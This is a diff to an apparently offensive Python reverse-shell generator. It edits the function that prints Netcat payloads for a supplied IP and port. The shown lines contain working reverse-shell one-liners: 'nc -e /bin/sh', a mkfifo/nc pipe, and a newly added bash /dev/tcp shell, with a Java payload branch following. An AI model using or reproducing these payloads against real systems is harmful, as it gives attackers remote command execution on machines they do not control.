@@ -61,7 +61,9 @@ def print_shell(ip,port,choice):
 		print(Fore.BLUE, '[+] Netcat Payload')
 		print(Fore.RED, 'Payload 01 => ', Fore.WHITE + '\n' + f'nc -e /bin/sh {ip} {port}')
 		print(Fore.WHITE + f'')
-		print(Fore.RED, 'Payload 02 => ', Fore.WHITE + '\n' + f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f')
+		print(Fore.RED, 'Payload 02 => ', Fore.WHITE + '\n' + f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} >/tmp/f')
+		print(Fore.WHITE + f'')
+		print(Fore.RED, 'Payload 03 => ', Fore.WHITE + '\n' + f'bash -i >& /dev/tcp/{ip}/{port} 0>&1')
 		
 	elif(choice == '7'):
 		print(Fore.BLUE, '[+] Java Payload')
